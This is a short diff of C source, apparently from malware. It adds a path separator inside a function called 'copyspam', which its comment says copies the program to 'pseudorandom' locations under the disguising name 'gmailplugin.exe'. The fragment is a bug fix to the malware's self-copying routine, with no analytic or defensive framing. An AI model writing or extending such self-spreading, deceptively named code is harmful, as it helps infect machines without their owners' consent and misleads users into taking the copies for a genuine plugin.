@@ -15,6 +15,7 @@ int copyspam(char s[50]){// makes a copy of the programm in 'pseudorandom' locat
 	for(i;i<2;i++){
 	char fullname[1024];
 	strcpy(fullname,s);
+	strcat(fullname,"\\");
 	char * original_file = "gmailplugin.exe";
 	strcat(fullname,"gmailplugin.exe");
     char * new_file = fullname;
